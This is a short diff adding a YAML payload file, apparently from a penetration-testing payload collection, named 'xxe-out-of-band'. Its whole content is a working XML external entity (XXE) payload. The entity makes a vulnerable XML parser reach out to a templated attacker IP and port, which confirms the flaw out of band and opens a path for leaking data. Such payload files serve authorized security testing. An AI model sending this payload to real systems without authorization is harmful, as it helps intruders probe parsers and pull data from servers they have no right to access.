@@ -1,0 +1,10 @@
+metadata:
+  filename: "xxe-out-of-band.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY ent SYSTEM "http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/outofbounds"> ]>
+  <bar>&ent;</bar>
